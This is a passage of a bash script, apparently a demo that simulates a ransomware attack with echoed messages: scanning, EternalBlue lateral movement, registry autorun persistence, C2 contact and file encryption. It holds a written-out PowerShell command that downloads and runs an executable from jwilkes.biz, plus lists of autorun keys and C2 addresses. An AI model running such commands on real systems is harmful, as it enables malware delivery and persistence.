Defender\platform\4.18.1902.2-0\ConfigSecurityPolicy.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\Drivers" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpAzSubmit.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpCmdRun.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpCommu.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpRtp.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpSvc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpUpdate.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MsMpEng.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\NisSrv.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\Drivers\WdBoot.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\Drivers\WdFilter.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\Drivers\WdNisDrv.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0\X86\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Live\WLive48x48.png" "C:\Users\jwilkes\Notepad++\plugins" "C:\Users\jwilkes\Notepad++\plugins\Config" "C:\Users\jwilkes\Notepad++\plugins\DSpellCheck" "C:\Users\jwilkes\Notepad++\plugins\mimeTools" "C:\Users\jwilkes\Notepad++\plugins\NppConverter" "C:\Users\jwilkes\Notepad++\plugins\NppExport" "C:\Users\jwilkes\Notepad++\plugins\Config\nppPluginList.dll" "C:\Users\jwilkes\Notepad++\plugins\DSpellCheck\DSpellCheck.dll" "C:\Users\jwilkes\Notepad++\plugins\mimeTools\mimeTools.dll" "C:\Users\jwilkes\Notepad++\plugins\NppConverter\NppConverter.dll" "C:\Users\jwilkes\Notepad++\plugins\NppExport\NppExport.dll" "C:\Users\jwilkes\Package Cache\{37ea5771-3352-4a52-9fac-9297331daebd}" "C:\Users\jwilkes\Package Cache\{37ea5771-3352-4a52-9fac-9297331daebd}\RDPWInst.exe" "C:\Users\jwilkes\regid.1991-06.com.microsoft\regid.1991-06.com.microsoft_Windows-Server-2016-Datacenter.swidtag" "C:\Users\jwilkes\USOShared\Logs" "C:\Users\jwilkes\Desktop\resume.docx" "C:\Users\jwilkes\Desktop\tpsreport.docx" "C:\Users\jwilkes\Desktop\timesheet.xlsx" "C:\Users\jwilkes\Downloads\cat.jpg" "C:\Users\jwilkes\Downloads\mustang.png" "C:\Users\jwilkes\Downloads\corvette.png" "C:\Users\jwilkes\Downloads\camaro.png")

netArr=("jwilkes.biz" "52.198.56.20" "177.159.44.244" "34.18.163.220")

regArr=("KEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce")

smbArr=("192.168.0.5" "192.168.0.49" "192.168.0.63" "192.168.0.104" "192.168.0.127" "192.168.0.155" "192.168.0.201" "192.168.0.223" "192.168.0.224")

clear
echo ""
echo "  //////////////////////////////////////////////"
echo -e " //  \033[32mScanning for devices in 192.168.0.1/24\033[0m  //"
echo "//////////////////////////////////////////////" 
echo "" 
echo "Scanning device at:"

for i in ${!ipArr[@]};
do
  echo -ne "${ipArr[$i]} "
  sleep .01
done

echo ""
echo "" 
echo "  /////////////////////////////////////////////////////////"
echo -e " //  \033[32mAttempting lateral movement on vulnerable devices\033[0m  //"  
echo "/////////////////////////////////////////////////////////"
echo ""
echo "Attempting EternalBlue movement on following devices with SMBv1 enabled:"

for i in ${!smbArr[@]};
do
  echo -e "${smbArr[$i]} "
  sleep .4
done

echo ""
echo "  ////////////////////////////////////////////////"
echo -e " //  \033[32mEstablishing persistence using registry:\033[0m  //"  
echo "////////////////////////////////////////////////"
echo ""
echo "Modifying following autorun keys:"

for i in ${!regArr[@]};
do
  echo -e "${regArr[$i]} "
  sleep .4
done


echo ""
echo "  ///////////////////////////////////////////////////////////"
echo -e " //  \033[32mInvoking PowerShell, downloading Stage II encryptor\033[0m  //"
echo "///////////////////////////////////////////////////////////"
echo ""
echo "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe (New-Object) System.Net.WebClient.DownloadFile(http://jwilkes.biz/wk.ToString(), C:\Users\Public\jwilkes.exe)"
echo "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe Invoke-Expression C:\Users\Public\jwilkes.exe"


if [ -z ${kill} ]
then 

  if [ -z ${amazon} ]
  then
    :
  else
    # need to expand this to other tenants in PreProd (i.e. MSSDemo)
    ~/aws/bin/aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/645902574856/PMDemo.fifo --message-group-id pmdemo --message-body '{"isPredefined": "true","enrichment": "BV_jwilkes_event_handler"}'
  fi
  
	echo ""
	echo "  //////////////////////"
	echo -e " //  \033[32mContacting C2:\033[0m  //"
	echo "//////////////////////"
	echo ""
	for i in ${!netArr[@]};
	do
	  echo "${netArr[$i]}"
	  sleep .4
	done

	if [ -z ${pause} ]
	then 
		:
	else 
		read -p ""
	fi

	echo ""
	echo "  //////////////////////////////////"
	echo -e " //  \033[32mEncrypting sensitive files:\033[0m //" 
	echo "//////////////////////////////////"
	echo ""

	open "Ransom.png"

	while true; do 
		for i in ${!dirArr[@]};
		do
		  echo "Encrypting files at ${dirArr[$i]}"
		  sleep .01
		done
	done
else 
	echo ""
	echo "  //////////////////////////////////"
	echo -e " //  \033[32mEncrypting sensitive files:\033[0m //" 
	echo "//////////////////////////////////"
	echo ""

	echo "Encrypting files at ${dirArr[0]}"
	echo ""
fi
